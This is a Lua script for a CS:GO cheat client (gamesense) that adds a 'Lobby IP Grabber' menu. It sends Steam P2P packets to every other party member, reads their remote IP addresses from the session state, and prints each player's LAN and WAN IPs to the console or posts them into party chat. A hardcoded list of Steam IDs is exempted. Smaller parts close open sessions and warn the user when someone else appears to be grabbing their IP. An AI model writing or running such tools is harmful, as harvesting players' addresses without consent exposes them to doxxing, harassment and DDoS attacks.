local steamworks_api = require("gamesense/steamworks")
local steam_networking = steamworks_api.ISteamNetworking
local panorama_api = panorama.open()
local panorama_dollar = panorama_api["$"]
local persona_api = panorama_api.MyPersonaAPI
local party_list_api = panorama_api.PartyListAPI
local game_state_api = panorama_api.GameStateAPI
local lobby_api = panorama_api.LobbyAPI
local session_error = steamworks_api.EP2PSessionError
local send_flags = steamworks_api.EP2PSend

local queued_steam_ids = {}
local steam_id_to_name = {}
local steam_id_to_ips = {}
local scanning_active = false
local blocked_ids = {
	["76561198108791626"] = true,
	["76561198237598500"] = true,
	["76561198089758951"] = true,
	["76561198861797912"] = true,
	["76561198148192561"] = true
}
local scan_lobby_for_ips
local collect_peer_ips
local close_open_sessions
local print_lobby_results

local output_mode = ui.new_combobox("MISC", "Miscellaneous", "Output", {
	"Party Chat",
	"Console"
})

ui.set(output_mode, "Console")
ui.set_visible(output_mode, false)

local mask_ips = ui.new_checkbox("MISC", "Miscellaneous", "Mask IPs")
ui.set_visible(mask_ips, false)

local grab_button = ui.new_button("MISC", "Miscellaneous", "Grab", function()
	scan_lobby_for_ips()
end)
ui.set_visible(grab_button, false)

ui.set_callback(ui.new_checkbox("MISC", "Miscellaneous", "Lobby IP Grabber"), function(toggle)
	local enabled = ui.get(toggle)

	ui.set_visible(output_mode, enabled)
	ui.set_visible(mask_ips, enabled)
	ui.set_visible(grab_button, enabled)
end)

local function send_party_chat(message)
	panorama_api.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", game_state_api.GetXuid(), message:gsub(" ", "\194\160")))
end

local function log_message(...)
	if ui.get(output_mode) == "Console" then
		print(table.concat(table.pack(...), " "))
	elseif ui.get(output_mode) == "Party Chat" then
		send_party_chat(table.concat(table.pack(...), " "))
	end
end

local function format_ip(ip_value, masked)
	ip_value = tonumber(ip_value)

	local octet_a = math.floor(ip_value / 16777216)
	local octet_b = math.floor((ip_value - octet_a * 16777216) / 65536)
	local octet_c = math.floor((ip_value - octet_a * 16777216 - octet_b * 65536) / 256)
	local octet_d = math.floor(ip_value - octet_a * 16777216 - octet_b * 65536 - octet_c * 256)

	if masked then
		return octet_a .. "." .. octet_b .. ".xxx.xxx"
	end

	return octet_a .. "." .. octet_b .. "." .. octet_c .. "." .. octet_d
end

function print_lobby_results()
	for steam_id, ip_list in pairs(steam_id_to_ips) do
		local name = steam_id_to_name[steam_id] or tostring(steam_id)
		local line_prefix = name .. ": "
		local output_line = ""

		for index, ip_value in ipairs(ip_list) do
			local prefix = #ip_list == 1 and "WAN: " or index == 1 and "LAN: " or "WAN: "
			output_line = output_line .. prefix .. format_ip(ip_value, ui.get(mask_ips)) .. (#ip_list == 1 and "" or index == 1 and " | " or "")
		end

		log_message(line_prefix, output_line)
	end
end

function collect_peer_ips()
	for _, steam_id in ipairs(queued_steam_ids) do
		local _, session_state = steam_networking.GetP2PSessionState(steam_id)

		if session_state.m_nRemoteIP ~= 0 then
			steam_id_to_ips[steam_id] = steam_id_to_ips[steam_id] or {}

			local already_recorded = false
			for _, known_ip in ipairs(steam_id_to_ips[steam_id]) do
				if known_ip == session_state.m_nRemoteIP then
					already_recorded = true
					break
				end
			end

			if not already_recorded and not blocked_ids[tostring(steam_id)] then
				table.insert(steam_id_to_ips[steam_id], session_state.m_nRemoteIP)
			end
		end
	end

	if scanning_active then
		client.delay_call(0.25, collect_peer_ips)
	end
end

function close_open_sessions()
	if steam_networking.IsSessionActive() and not scanning_active then
		for index = 0, party_list_api.GetCount() - 1 do
			if party_list_api.GetXuidByIndex(index):len() > 7 and party_list_api.GetXuidByIndex(index) ~= game_state_api.GetXuid() then
				steam_networking.CloseP2PSessionWithUser(steamworks_api.SteamID(party_list_api.GetXuidByIndex(index)))
			end
		end
	end

	client.delay_call(0.01, close_open_sessions)
end

function scan_lobby_for_ips()
	queued_steam_ids = {}
	steam_id_to_name = {}
	steam_id_to_ips = {}
	scanning_active = true

	for index = 0, party_list_api.GetCount() - 1 do
		local xuid = party_list_api.GetXuidByIndex(index)

		if xuid:len() > 7 and xuid ~= game_state_api.GetXuid() then
			local steam_id = steamworks_api.SteamID(xuid)

			queued_steam_ids[#queued_steam_ids + 1] = steam_id
			steam_id_to_name[steam_id] = party_list_api.GetFriendName(index)
			steam_networking.SendP2PPacket(steam_id, "asdf", 4, send_flags.UnreliableNoDelay, 0)
		end
	end

	log_message("[[ IP GRABBER ]]")
	log_message("# Added " .. #queued_steam_ids .. " to queue!")
	log_message("# Waiting 5 secs...")

	client.delay_call(5, function()
		scanning_active = false
		print_lobby_results()
	end)

	collect_peer_ips()
end

steamworks_api.set_callback("P2PSessionRequest_t", function(request_event)
	local remote_steam_id = request_event.m_steamIDRemote
	local _, session_state = steam_networking.GetP2PSessionState(remote_steam_id)

	if not party_list_api.IsPartyMember(tostring(remote_steam_id)) then
		return
	end

	print("[POTENTIAL GRABBER] ", persona_api.GetFriendName(remote_steam_id), " (", remote_steam_id, ") might be trying to steal your ip!")

	for attempt = 1, 10 do
		client.delay_call(attempt == 1 and 0 or (attempt - 1) * 10 / 1000, function()
			panorama_dollar.DispatchEvent("PlaySoundEffect", "container_weapon_ticker", "MOUSE")
		end)
	end
end)

client.delay_call(0.01, close_open_sessions)
